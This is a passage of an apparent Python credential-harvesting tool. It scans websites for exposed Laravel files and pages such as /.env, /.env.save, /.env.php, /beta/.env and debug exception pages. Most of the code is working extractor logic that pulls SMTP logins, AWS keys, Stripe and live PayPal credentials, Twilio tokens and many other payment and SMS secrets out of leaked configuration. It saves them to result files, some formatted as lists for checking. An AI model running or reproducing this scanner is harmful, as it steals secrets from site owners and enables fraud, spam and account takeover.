import requests
import os
from re import findall as reg
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor
from modules import logos

save = True
chk = False

fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
fb = '\033[94m'
flc = '\033[96m'
bd = '\u001b[1m'
res = '\u001b[0m'

colors = [fg,fr,fy,fb,flc]

requests.packages.urllib3.disable_warnings()

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

def ref_eq(inp):
    return str(inp).replace('=',' = ',1)

def url_method_add(url,method,source):
    return 'URL = {}\nMETHOD = {}\n{}'.format(url,method,source)

def remove_cot(inp):
    try:
        rep = reg('= "(.*?)"',str(inp))[0]
        return str(inp).replace('= "{}"'.format(rep),'= {}'.format(rep))
    except:
        try:
            rep = reg("= '(.*?)'",str(inp))[0]
            return str(inp).replace("= '{}'".format(rep),'= {}'.format(rep))
        except:
            pass
    
def reformat_text_phpinfo(source):
    source = bs(source,'html.parser')
    table = source.find_all('table')
    for tab in table:
        if '$_SERVER' in str(tab):
            table = str(tab)
    fields = reg('<td class="e">(.*?)</td><td class="v">(.*?)</td></tr>',str(table))
    out = ''
    for field in fields:
        e = str(field[0]).split("['")[1].split("']")[0]
        v = field[1]
        x = '{} = {}'.format(e,v)
        if str(x) not in str(out):
            out += str(x) + '\n'
    return out

def reformat_text_Exception(source):
    source = bs(source,'html.parser')
    out = ''
    table = source.find('div',{'class':'data-table','id':'sg-environment-variables'}).find_all('tr')
    for t in table:
        if '<td>' in str(t):
            all = str(t).replace('\n','')
            name = str(all).split('<tr><td>')[1].split('</td><td>')[0]
            value = str(all).split('</span')[0].split('>')[-1]
            x = '{} = {}'.format(name,value)
            if ('= "' in str(x) and str(x).endswith('"')) or ("= '" in str(x) and str(x).endswith("'")):
                x = remove_cot(str(x))
            if str(x) not in str(out):
                if str(x).split('=')[1].replace(' ','') != '':
                    out += str(x) + '\n'
    return out

def reformat_text_env(source):
    source = str(source).split('\n')
    source = [source.replace('\r','') for source in source if str(source).replace('\r','') != '' and not(str(source).startswith('#')) and '${' not in str(source)] 
    source = [source for source in source if '=' in str(source) and str(source).split('=')[1] != '']
    out = ''
    for s in source:
        s = ref_eq(str(s))
        if ('= "' in str(s) and str(s).endswith('"')) or ("= '" in str(s) and str(s).endswith("'")):
            s = remove_cot(str(s))
        if str(s) not in str(out):
            out += s + '\n'
    return out

def reformat_text_config_js(source):
    source = str(source).split('\n')
    out = ''
    for dd in source:
        if ':"' in str(dd):
            name , value = str(dd).split(':',1)
            value = reg('"(.*?)"',str(value))[0]
            if str(value) != '':
                x = '{} = {}'.format(name,value)
                out += str(x) + '\n'
    return out

def reformat_text_js(source):
    source = str(source).split('\n')
    source = [source.replace('const ','') for source in source if str(source).startswith('const')]
    out = ''
    for s in source:
        if "= '" in str(s):
            n = str(s).split('=')[0].replace(' ','')
            v = reg("= '(.*?)';",str(s))[0]
            out += '{} = {}'.format(n,v) + '\n'
    return out

def debugfixer(source):
    out = ''
    source = bs(source ,'html.parser')
    tags = source.find_all('table',{'class':'data-table'})
    for tag in tags:
        if 'APP_KEY' in str(tag):
            source = tag
    tags = source.find_all('tr')
    for tag in tags:
        try:
            name = reg('<td>(.*?)</td>',str(tag))[0]
            value = str(tag).split('</span')[0].split('">')[-1].split('</pre')[0].strip()
            s = '{} = {}'.format(name,value)
            if '= "' in str(s) or "= '" in str(s):
                s = remove_cot(str(s))
            if str(s).split('=')[1].replace(' ','') != '':
                if str(s) not in str(out):
                    out += s + '\n'
        except:pass
    return out

def smtp_reformat(text):
    host = ''
    port = ''
    user = ''
    pwd = ''
    from_ = ''
    text = str(text).split('\n')
    for line in text:
        if '_host' in str(line).lower():
            host = str(line).split('=')[1].strip()
        elif '_port' in str(line).lower():
            port = str(line).split('=')[1].strip()
        elif '_user' in str(line).lower():
            user = str(line).split('=')[1].strip()
        elif '_pass' in str(line).lower():
            pwd = str(line).split('=')[1].strip()
        elif '_from' in str(line).lower():
            from_ = str(line).split('=')[1].strip()
    
    if from_ != '':
        text = '{}|{}|{}|{}|{}'.format(host,port,user,pwd,from_)
    else:
        text = '{}|{}|{}|{}'.format(host,port,user,pwd)
    return text

def twillio_reformat(text):
    TAS = ''
    TAT = ''
    TN = ''
    text = str(text).split('\n')
    for line in text:
        if '_sid' in str(line).lower():
            TAS = str(line).split('=')[1].strip()
        elif '_token' in str(line).lower():
            TAT = str(line).split('=')[1].strip()
        elif '_number' in str(line).lower():
            TN = str(line).split('=')[1].strip()
    
    if TN == '':
        text = '{}|{}'.format(TAS , TAT)
    else:
        text = '{}|{}|{}'.format(TAS , TAT , TN)
    
    return text

# ========================================== MINI EXTRACTORS

def get_smtp(source):
    blacklistedkeywords = ['reply','certificate','mailer','encryption','admin','dev','driver','from_name','key','ippis','crc','mailchimp','timesheet','ending','magazine']
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'mail_' in str(x).lower():
            tt = 0
            for aze in blacklistedkeywords:
                if str(aze).lower() in str(x).lower():
                    tt +=1
            if tt == 0:
                if 'null' not in str(s).split('=')[1] and 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]: 
                        out += s + '\n'
    if 'host' in str(out).lower() and 'user' in str(out).lower() and ('pass' in str(out).lower() or 'password' in str(out).lower() or 'secret' in str(out).lower()):
        return True , out
    else:
        return False , ''

def get_aws(source):
    blacklistedkeywords = ['bucket','user','backend','url','path','poster','event','faq','profile','complaint','card','task','driver','db','queue','kourses','token']
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'aws_' in str(x).lower() or 's3_' in str(x).lower() or 'ses_' in str(x).lower() or 'laravel_' in str(x).lower():
            tt = 0
            for aze in blacklistedkeywords:
                if str(aze).lower() in str(x).lower():
                    tt +=1
            if tt == 0:
                if 'http' not in str(s).split('=')[1]:
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
    if 'key' in str(out).lower() and 'secret' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_stripe(source):
    blacklistedkeywords = ['product','price']
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'stripe' in str(x).lower():
            tt = 0
            for aze in blacklistedkeywords:
                if str(aze).lower() in str(x).lower():
                    tt +=1
            if tt == 0:
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
    if 'stripe' in str(out).lower() and ('key' in str(out).lower() or 'client' in str(out).lower() or 'secret' in str(out).lower() or 'public' in str(out).lower()):
        return True , out
    else:
        return False , ''

def get_razorpay(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'razorpay' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'razorpay' in str(out).lower() and 'key' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_twilio(source):
    blacklistedkeywords = ['twiml','profile','key','verify','chat','call','plivo','test','service','notification','path']
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'twilio' in str(x).lower() or 'twillo' in str(x).lower() or 'twillio' in str(x).lower() or 'auth_token' in str(x).lower() or 'account_sid' in str(x).lower():
            tt = 0
            for aze in blacklistedkeywords:
                if str(aze).lower() in str(x).lower():
                    tt +=1
            if tt == 0:
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
    if ('twilio' in str(out).lower() or 'twillo' in str(out).lower() or 'twillio' in str(out).lower()) and ('sid' in str(out).lower() or 'id' in str(out).lower()) and 'token' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_nexmo(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'nexmo' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'nexmo' in str(out).lower() and 'key' in str(out).lower() and 'secret' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_paypal_sandbox(source):
    blacklistedkeywords = ['certificate']
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'paypal_sandbox' in str(x).lower():
            tt = 0
            for aze in blacklistedkeywords:
                if str(aze).lower() in str(x).lower():
                    tt +=1
            if tt == 0:
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
    if 'paypal_sandbox' in str(out).lower() and ('username' in str(out).lower() or 'password' in str(out).lower() or 'secret' in str(out).lower() or 'id' in str(out).lower()):
        return True , out
    else:
        return False , ''

def get_paypal_live(source):
    blacklistedkeywords = ['certificate']
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'paypal_live' in str(x).lower():
            tt = 0
            for aze in blacklistedkeywords:
                if str(aze).lower() in str(x).lower():
                    tt +=1
            if tt == 0:
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
    if 'paypal_live' in str(out).lower() and( 'username' in str(out).lower() or 'password' in str(out).lower() or 'secret' in str(out).lower() or 'id' in str(out).lower()):
        return True , out
    else:
        return False , ''

def get_onesignal(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'onesignal' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'onesignal' in str(out).lower() and 'key' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_telnyx(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'telnyx_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'telnyx' in str(out).lower() and ('number' in str(out).lower() or 'from' in str(out).lower()) and 'secret' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_textlocal(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'textlocal_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'textlocal' in str(out).lower() and 'key' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_value_leaf(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'value_leaf_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'value_leaf' in str(out).lower() and 'key' in str(out).lower() and 'username' in str(out).lower() and 'password' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_sms(source):
    blacklistedkeywords = ['disabled']
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'sms' in str(x).lower():
            tt = 0
            for aze in blacklistedkeywords:
                if str(aze).lower() in str(x).lower():
                    tt +=1
            if tt == 0:
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
    if 'sms' in str(out).lower():
        return True , out
    else:
        return False , ''
    
def get_openpay(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'openpay_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'openpay' in str(out).lower() and ('key' in str(out).lower() or 'client' in str(out).lower() or 'secret' in str(out).lower() or 'public' in str(out).lower()):
        return True , out
    else:
        return False , ''
    
def get_clicksend(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'clicksend_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'clicksend' in str(out).lower() and 'username' in str(out).lower() and 'key' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_xgate(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'xgate_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'xgate' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_aimon(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'aimon_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'aimon' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_plivo(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'plivo_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'plivo' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_aruba(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'aruba_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if 'aruba' in str(out).lower():
        return True , out
    else:
        return False , ''

def get_skebby(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'skebby_' in str(x).lower() or 'skbby_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if ('skebby' in str(out).lower() or 'skbby' in str(out).lower()):
        return True , out
    else:
        return False , ''
    
def get_clickatell(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'clickatell_' in str(x).lower():
            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                    out += s + '\n'
    if ('clickatell' in str(out).lower() or 'key' in str(out).lower()):
        return True , out
    else:
        return False , ''
    
# Extractors 

def Extractor(url,method,source):
    if not os.path.isdir('Laravel_Results'):
        os.mkdir('Laravel_Results')
    msg = '{}[\u001b[32;1m+\u001b[0m] {} [ {}{}{} ] '.format(fw,url,fr,method,fw)
    cc = get_smtp(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# SMTP #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/SMTP.txt','a',errors='ignore').write(text + '\n')
            try:
                open('Laravel_Results/SMTP_to_check.txt','a',errors='ignore').write(smtp_reformat(text) + '\n')
            except:
                nyx = ''
        msg += '\u001b[1m\u001b[42;1m SMTP \u001b[0m '

    cc = get_aws(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# AWS #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/AWS.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m AWS \u001b[0m '

    cc = get_stripe(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# STRIPE #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/STRIPE.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m STRIPE \u001b[0m '
    
    cc = get_razorpay(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# RAZORPAY #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/RAZORPAY.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m RAZORPAY \u001b[0m '
    
    cc = get_paypal_sandbox(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# PAYPAL_SANDBOX #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/PAYPAL_SANDBOX.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m PAYPAL SANDBOX \u001b[0m '
    
    cc = get_paypal_live(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# PAYPAL_LIVE #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/PAYPAL_LIVE.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m PAYPAL LIVE \u001b[0m '
    
    cc = get_twilio(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# TWILIO #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/TWILIO.txt','a',errors='ignore').write(text + '\n')
            try:
                open('Laravel_Results/TWILIO_To_Check.txt','a',errors='ignore').write(twillio_reformat(text) + '\n')
            except:
                nyx = ''
        msg += '\u001b[1m\u001b[42;1m TWILIO \u001b[0m '

    cc = get_nexmo(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# NEXMO #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/NEXMO.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m NEXMO \u001b[0m '
    
    cc = get_onesignal(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# ONESIGNAL #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/ONESIGNAL.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m ONESIGNAL \u001b[0m '
    
    cc = get_telnyx(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# TELNYX #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/TELNYX.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m TELNYX \u001b[0m '
    
    cc = get_textlocal(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# TEXTLOCAL #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/TEXTLOCAL.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m TEXTLOCAL \u001b[0m '
    
    cc = get_value_leaf(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# VALUE_LEAF #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/VALUE_LEAF.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m VALUE_LEAF \u001b[0m '
    
    cc = get_sms(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# SMS #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/POSSIBLE_SMS.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m SMS \u001b[0m '
    
    cc = get_openpay(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# OPENPAY #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/OPENPAY.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m OPENPAY \u001b[0m '
    
    cc = get_clicksend(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# CLICKSEND #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/CLICKSEND.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m CLICKSEND \u001b[0m '
    
    cc = get_xgate(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# XGATE #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/XGATE.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m XGATE \u001b[0m '
    
    cc = get_aimon(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# AIMON #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/AIMON.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m AIMON \u001b[0m '
    
    cc = get_plivo(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# PLIVO #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/PLIVO.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m PLIVO \u001b[0m '
    
    cc = get_aruba(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# ARUBA #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/ARUBA.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m ARUBA \u001b[0m '
    
    cc = get_skebby(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# SKEBBY #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/SKEBBY.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m SKEBBY \u001b[0m '
    
    cc = get_clickatell(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# CLICKATELL #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/CLICKATELL.txt','a',errors='ignore').write(text + '\n')
        msg += '\u001b[1m\u001b[42;1m CLICKATELL \u001b[0m '
    
    if str(msg)[-2] == ']':
        msg += "[ {}Couldn't Get Anything{} ]".format(fr,fw)

    print(msg)

# ========================================== METHODS

def env(url):
    method = '/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_save(url):
    method = '/.env.save'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_php(url):
    method = '/.env.php'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                            print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                            print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def beta_env(url):
    method = '/beta/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
